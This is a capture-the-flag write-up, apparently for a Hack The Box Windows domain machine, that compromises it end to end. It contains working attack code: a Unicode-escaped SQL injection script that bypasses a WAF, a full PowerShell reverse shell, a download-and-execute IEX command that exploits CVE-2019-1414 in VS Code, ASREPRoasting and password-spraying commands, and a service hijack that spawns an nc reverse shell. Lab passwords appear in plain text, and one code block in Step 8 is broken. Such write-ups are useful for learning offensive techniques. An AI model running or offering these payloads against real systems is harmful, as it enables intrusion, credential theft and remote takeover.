<h2 id="sql-injection-discovery">SQL Injection Discovery</h2>
<h3 id="step-3-discover-the-injection-point">Step 3: Discover the Injection Point</h3>
<p><strong>Why:</strong> The web application has a "Colleague Finder" feature that searches employees. This is a classic attack surface for SQL injection.</p>
<p>Navigate to <code>http://10.129.95.200</code> and find the employee search page. It sends a POST request to <code>/api/getColleagues</code> with JSON body <code>{"name":"a"}</code>.</p>
<p><strong>Testing normal behavior:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.95.200/api/getColleagues \
  -H "Content-Type: application/json" \
  -d '{"name":"a"}' | python3 -m json.tool | head -20
</code></pre>
<p>Returns a JSON array of employees with fields: <code>id</code>, <code>name</code>, <code>position</code>, <code>email</code>, <code>src</code>.</p>
<p><strong>Testing for SQL injection:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.95.200/api/getColleagues \
  -H "Content-Type: application/json" \
  -d '{"name":"\u0027"}'
</code></pre>
<p><strong>Result:</strong> <code>null</code></p>
<p> The single quote (<code>'</code>) is encoded as <code>\u0027</code> (Unicode escape). The application returns <code>null</code> instead of the normal employee list, indicating the SQL query broke. This confirms SQL injection.</p>
<p><strong>WAF/Encoding context:</strong> The application has a WAF that blocks raw quotes. Because the Content-Type is <code>application/json;charset=utf-8</code>, the server decodes Unicode escape sequences. By encoding our payload in Unicode escapes (<code>\u00XX</code>), we bypass the WAF entirely.</p>

<h2 id="sql-injection-exploitation-dumping-hashes">SQL Injection Exploitation - Dumping Hashes</h2>
<h3 id="step-4-manual-union-based-extraction">Step 4: Manual UNION-Based Extraction</h3>
<p><strong>Why:</strong> We need to extract data from the database. Since it's MSSQL, we use UNION-based injection. We first determine the number of columns and which ones return data.</p>
<p><strong>Payload structure:</strong> The original query likely looks like:</p>
<pre><code class="language-sql" data-language="sql">SELECT id, name, position, email, src FROM Colleagues WHERE name LIKE '%INPUT%'
</code></pre>
<p>This means there are <strong>5 columns</strong>, and columns 2 and 3 (<code>name</code> and <code>position</code>) return visible data.</p>
<p><strong>Python helper for Unicode encoding:</strong></p>
<pre><code class="language-python" data-language="python">import requests
import json

url = "http://10.129.95.200/api/getColleagues"

def encode_payload(s):
    return ''.join([f'\\u{ord(c):04x}' for c in s])

# Dump usernames and passwords from Logins table
payload = "a' UNION SELECT 1,username,password,4,5 FROM Logins-- -"
data = '{"name":"' + encode_payload(payload) + '"}'
r = requests.post(url, data=data, headers={"Content-Type":"application/json"})
print(r.text)
</code></pre>
<p><strong>Result:</strong> We extract 17 username/password pairs from the <code>Hub_DB.Logins</code> table.</p>
<p><strong>Why UNION SELECT works:</strong> The original query returns 5 columns. Our <code>UNION SELECT 1,username,password,4,5</code> matches the column count. The <code>username</code> goes into the <code>name</code> field of the JSON response, and <code>password</code> goes into the <code>position</code> field.</p>

<h2 id="rid-brute-force-via-sql-injection">RID Brute-Force via SQL Injection</h2>
<h3 id="step-6-why-rid-brute-forcing">Step 6: Why RID Brute-Forcing?</h3>
<p><strong>Why:</strong> The usernames from the web database don't all have domain accounts. Even worse, password spraying the known users with the cracked passwords fails. We need to find <strong>additional domain users</strong> that aren't in the web app's database.</p>
<p><strong>Active Directory SID Structure:</strong></p>
<ul>
<li>Every AD object has a Security Identifier (SID)</li>
<li>Domain SID + Relative Identifier (RID) = Full SID</li>
<li>Well-known RIDs: 500 (Administrator), 512 (Domain Admins), 1000+ (domain objects)</li>
</ul>
<p><strong>MSSQL Functions for AD Enumeration:</strong></p>
<ul>
<li><code>SUSER_SID('DOMAIN\User')</code> → returns binary SID</li>
<li><code>SUSER_SNAME(binary_sid)</code> → returns username from SID</li>
<li><code>sys.fn_varbintohexstr()</code> → converts binary to hex string</li>
</ul>
<h3 id="step-7-extract-the-domain-sid">Step 7: Extract the Domain SID</h3>
<pre><code class="language-python" data-language="python">payload = "a' UNION SELECT 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\\Administrator'))),3,4,5-- -"
</code></pre>
<p><strong>Result:</strong> <code>REDACTED_ENCODED_LAB_MATERIAL</code></p>
<p><strong>Decoding:</strong></p>
<ul>
<li>Domain SID (first 48 bytes): <code>S-1-5-21-3167813660-1240564177-918740779</code></li>
<li>RID (last 8 bytes): <code>f4010000</code> → reversed <code>0x000001f4</code> → <strong>500</strong> (Administrator)</li>
</ul>
<h3 id="step-8-brute-force-rids">Step 8: Brute-Force RIDs</h3>
<p><strong>Why:</strong> By iterating RIDs from 1000+ and constructing SIDs, we can discover domain users, groups, and computers not exposed by the web app.</p>
<pre><code class="language-python" data-language="python">import requests

    sid = f"{domain_sid}-{rid}"

<p><strong>Results:</strong></p>
<ul>
<li>SMB: <code>MEGACORP.LOCAL\tushikikatomo:finance1</code> </li>
<li>WinRM: <code>MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)</code> </li>
</ul>
<h3 id="step-10-evil-winrm-and-user-flag">Step 10: evil-winrm and User Flag</h3>
<p><strong>Why:</strong> WinRM (Windows Remote Management) on port 5985 is PowerShell remoting. <code>evil-winrm</code> gives us an interactive PowerShell session.</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u tushikikatomo -p REDACTED
</code></pre>
<pre><code class="language-powershell" data-language="powershell">cat C:\Users\alcibiades\Desktop\user.txt
</code></pre>
<p><strong>Result:</strong> <code>f2f7bb[redacted]1ef697903</code></p>
<p><strong>Note:</strong> The user folder is <code>alcibiades</code>, not <code>tushikikatomo</code>. This happens when the user profile is mapped to a different folder name.</p>

<h2 id="privilege-escalation-vs-code-cve-2019-1414">Privilege Escalation: VS Code CVE-2019-1414</h2>
<h3 id="step-11-discover-vs-code-running">Step 11: Discover VS Code Running</h3>
<p><strong>Why:</strong> As <code>tushikikatomo</code>, we have limited privileges. We need to find a local privilege escalation vector. Running processes show multiple <code>Code.exe</code> instances.</p>
<pre><code class="language-powershell" data-language="powershell">Get-Process | Where-Object {$_.ProcessName -like "*Code*"}
(Get-Command "C:\Program Files\Microsoft VS Code\Code.exe").FileVersionInfo.FileVersion
</code></pre>
<p><strong>Result:</strong> Version <strong>1.37.1</strong></p>
<p><strong>Vulnerability Analysis:</strong></p>
<ul>
<li>VS Code versions before 1.38 are vulnerable to <strong>CVE-2019-1414</strong></li>
<li>VS Code's Electron/Chromium framework exposes a <strong>CEF debugger</strong> on <code>127.0.0.1</code> with a random port</li>
<li>The debugger accepts WebSocket connections and can execute arbitrary JavaScript via Node.js's <code>child_process</code></li>
<li>Since VS Code runs as a different user (<code>cyork</code>), exploiting this gives us code execution as that user</li>
</ul>
<h3 id="step-12-download-and-use-cefdebug-exe">Step 12: Download and Use cefdebug.exe</h3>
<p><strong>Why:</strong> <code>cefdebug</code> (by Tavis Ormandy) scans for CEF debug listeners and allows connecting to them to execute code.</p>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">wget -q https://github.com/taviso/cefdebug/releases/download/v0.1/cefdebug.zip
unzip cefdebug.zip
</code></pre>
<p>On target (via evil-winrm):</p>
<pre><code class="language-powershell" data-language="powershell">Invoke-WebRequest -Uri "http://10.10.17.27:8080/cefdebug/cefdebug.exe" -OutFile "cefdebug.exe"
.\cefdebug.exe
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583
</code></pre>
<h3 id="step-13-exploit-the-debugger">Step 13: Exploit the Debugger</h3>
<p><strong>Why:</strong> The CEF debugger runs JavaScript in VS Code's renderer process, which has access to Node.js APIs. We use <code>process.mainModule.require('child_process').exec()</code> to spawn a system command.</p>
<p><strong>Setup on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash"># Terminal 1: HTTP server
python3 -m http.server 8080

# Terminal 2: Netcat listener
nc -lnvp 4444
</code></pre>
<p><strong>Create reverse shell script (<code>shell.ps1</code>):</strong></p>
<pre><code class="language-powershell" data-language="powershell">$client = New-Object System.Net.Sockets.TCPClient('10.10.17.27',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2&gt;&amp;1 | Out-String )
    $sendback2 = $sendback + 'PSReverseShell# '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
</code></pre>
<p><strong>Exploit command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">.\cefdebug.exe --url ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.17.27:8080/shell.ps1\')')"
</code></pre>
<p><strong>Result:</strong> Reverse shell connects to Kali as <code>cyork</code>.</p>
<pre><code>PSReverseShell# whoami
megacorp\cyork
</code></pre>

<h2 id="lateral-movement-cyork-sbauer">Lateral Movement: cyork -&gt; sbauer</h2>
<h3 id="step-14-find-the-hardcoded-password">Step 14: Find the Hardcoded Password</h3>
<p><strong>Why:</strong> <code>cyork</code> has read access to <code>C:\inetpub\wwwroot\bin\</code> (the web application directory). The <code>.dll</code> files may contain hardcoded credentials.</p>
<p>The <code>MultimasterAPI.dll</code> contains the database connection string:</p>
<pre><code>server=localhost;database=Hub_DB;uid=finder;password=REDACTED;
</code></pre>
<p><strong>Why this exists:</strong> Developers often hardcode credentials in compiled binaries, especially in <code>.config</code> files or connection strings embedded in DLLs.</p>
<h3 id="step-15-password-spray-with-new-password">Step 15: Password Spray with New Password</h3>
<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.95.200 -u all_users.txt -p REDACTED --continue-on-success
crackmapexec winrm 10.129.95.200 -u all_users.txt -p REDACTED --continue-on-success
</code></pre>
<p><strong>Result:</strong> <code>sbauer:D3veL0pM3nT!</code> with WinRM access.</p>

<h2 id="lateral-movement-sbauer-jorden-asreproast">Lateral Movement: sbauer -&gt; jorden (ASREPRoast)</h2>
<h3 id="step-16-discover-acl-abuse-path">Step 16: Discover ACL Abuse Path</h3>
<p><strong>Why:</strong> <code>sbauer</code> doesn't have direct admin access. We need to find an attack path in Active Directory. Using BloodHound or manual enumeration, we discover:</p>
<ul>
<li><code>sbauer</code> has <strong>GenericWrite</strong> over <code>jorden</code></li>
<li><code>jorden</code> is a member of <strong>Server Operators</strong> (high-value group)</li>
</ul>
<p><strong>GenericWrite Abuse:</strong> GenericWrite on a user object allows us to modify non-protected attributes, including <code>userAccountControl</code>. We can set <code>UF_DONT_REQUIRE_PREAUTH</code> to make the account AS-REP roastable.</p>
<h3 id="step-17-enable-preauth-bypass-on-jorden">Step 17: Enable Preauth Bypass on jorden</h3>
<p>Connect as <code>sbauer</code>:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u sbauer -p REDACTED
</code></pre>
<pre><code class="language-powershell" data-language="powershell">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
</code></pre>
<p><strong>Mechanism:</strong> The <code>Set-ADAccountControl</code> cmdlet modifies the <code>userAccountControl</code> attribute. Setting <code>doesnotrequirepreauth</code> to <code>$true</code> adds the <code>UF_DONT_REQUIRE_PREAUTH</code> flag (0x400000). This tells the KDC that the user doesn't need to pre-authenticate before requesting a TGT, allowing anyone to request an AS-REP for this user.</p>
<h3 id="step-18-asreproast-jorden">Step 18: ASREPRoast jorden</h3>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">impacket-GetNPUsers -format hashcat -usersfile jorden_only.txt -dc-ip 10.129.95.200 megacorp.local/sbauer:'D3veL0pM3nT!'
</code></pre>
<p><strong>Why ASREPRoasting works:</strong> Normally, Kerberos requires pre-authentication (proving knowledge of the password before getting a ticket). With <code>UF_DONT_REQUIRE_PREAUTH</code> disabled, we can request an AS-REP ticket for <code>jorden</code> without knowing the password. The AS-REP contains encrypted data that we can crack offline.</p>
<h3 id="step-19-crack-jorden-s-hash">Step 19: Crack jorden's Hash</h3>
<pre><code class="language-bash" data-language="bash">hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>rainforest786</code></p>

<h2 id="privilege-escalation-to-administrator-sebackupprivilege">Privilege Escalation to Administrator (SeBackupPrivilege)</h2>
<h3 id="step-20-evil-winrm-as-jorden">Step 20: evil-winrm as jorden</h3>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u jorden -p REDACTED
</code></pre>
<h3 id="step-21-check-privileges">Step 21: Check Privileges</h3>
<pre><code class="language-powershell" data-language="powershell">whoami /priv
</code></pre>
<p><strong>Key privileges:</strong></p>
<ul>
<li><code>SeBackupPrivilege</code> (Enabled)</li>
<li><code>SeRestorePrivilege</code> (Enabled)</li>
</ul>
<p><strong>Why SeBackupPrivilege is powerful:</strong></p>
<ul>
<li>Members of the <strong>Backup Operators</strong> group (and <strong>Server Operators</strong>) have this privilege</li>
<li>It grants <strong>read access to ALL files</strong>, bypassing normal ACL permissions</li>
<li>When combined with backup-aware tools (like <code>robocopy /B</code>), it allows copying files the user normally cannot access</li>
</ul>
<h3 id="step-22-copy-root-txt-using-backup-mode">Step 22: Copy root.txt Using Backup Mode</h3>
<p><strong>Why <code>robocopy /B</code>:</strong> The <code>/B</code> flag tells robocopy to use backup mode, which uses the <code>SeBackupPrivilege</code> to bypass file ACLs. This is a standard Windows feature designed for backup software.</p>
<pre><code class="language-powershell" data-language="powershell">robocopy C:\Users\Administrator\Desktop C:\Users\jorden\Desktop root.txt /B
</code></pre>
<p><strong>Result:</strong> The 34-byte <code>root.txt</code> is copied successfully despite <code>jorden</code> not having normal read access to <code>C:\Users\Administrator\Desktop</code>.</p>
<h3 id="step-23-read-the-flag">Step 23: Read the Flag</h3>
<pre><code class="language-powershell" data-language="powershell">cat C:\Users\jorden\Desktop\root.txt
</code></pre>
<p><strong>Result:</strong> <code>6fe41f[redacted]0413d08e</code></p>

<h2 id="alternative-root-paths">Alternative Root Paths</h2>
<h3 id="acl-modification-method-writeups-1-and-2">ACL Modification Method (Writeups 1 &amp; 2)</h3>
<p>Instead of <code>robocopy</code>, you can also use PowerShell to directly modify ACLs:</p>
<pre><code class="language-powershell" data-language="powershell">$user = 'MEGACORP\jorden'
$folder = 'C:\Users\Administrator'
$acl = Get-ACL $folder
$aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
$aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
$acl.AddAccessRule($aclrule)
Set-Acl -Path $folder -AclObject $acl
</code></pre>
<p><strong>Mechanism:</strong> <code>SeRestorePrivilege</code> allows restoring files and directories, which includes the ability to modify ACLs on any file.</p>
<h3 id="service-hijacking-method-writeup-2">Service Hijacking Method (Writeup 2)</h3>
<p><code>jorden</code> (as Server Operators) can start/stop services. You can modify service binaries to get a SYSTEM shell:</p>
<pre><code class="language-powershell" data-language="powershell">REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\nc.exe 10.10.17.27 4445 -e cmd.exe" /f
sc.exe start VSS
</code></pre>
<p><strong>Mechanism:</strong> Server Operators can modify service configurations and start/stop services. When the service starts, it executes the hijacked binary as <strong>SYSTEM</strong>.</p>

<h2 id="lessons-learned">Lessons Learned</h2>
<ol>
<li><p><strong>Unicode WAF Bypass:</strong> JSON endpoints with <code>charset=utf-8</code> may decode <code>\u00XX</code> escape sequences before passing input to the SQL query, allowing WAF bypass.</p>
</li>
<li><p><strong>AD Enumeration via SQLi:</strong> MSSQL's <code>SUSER_SID()</code> and <code>SUSER_SNAME()</code> functions can enumerate Active Directory objects through SQL injection, even without command execution.</p>
</li>
<li><p><strong>RID Brute-Forcing:</strong> Domain SIDs are predictable. Brute-forcing RIDs through SQLi can reveal hidden users critical for lateral movement.</p>
</li>
<li><p><strong>CEF Debugger Exploitation:</strong> Electron applications (like VS Code) expose powerful debug interfaces. Check running processes for IDEs and browsers.</p>
</li>
<li><p><strong>GenericWrite -&gt; ASREPRoast:</strong> GenericWrite on a user is a direct path to compromise. Enabling <code>doesnotrequirepreauth</code> and AS-REP roasting is faster than targeted Kerberoasting.</p>
</li>
<li><p><strong>SeBackupPrivilege:</strong> Don't overlook backup/restore privileges. <code>robocopy /B</code> is a simple, elegant way to read protected files without modifying ACLs or getting a full SYSTEM shell.</p>
</li>
